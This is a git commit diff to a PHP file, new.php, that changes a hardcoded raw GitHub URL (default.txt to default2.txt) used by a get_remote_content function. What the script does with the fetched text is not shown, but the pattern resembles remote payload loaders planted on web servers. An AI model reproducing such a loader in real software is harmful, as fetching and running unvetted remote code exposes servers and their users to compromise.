fa698fce2e6189eb78dc312778bda01e86ee678f
vovkapudinov-beep <vovkapudinov@gmail.com>
2025-12-30 02:32:50 +0300

    Update new.php

--- new.php
+++ new.php
@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/default.txt';
+$url = 'https://raw.githubusercontent.com/vovkapudinov-beep/litespeed/refs/heads/main/default2.txt';
 
 
 function get_remote_content($url) {
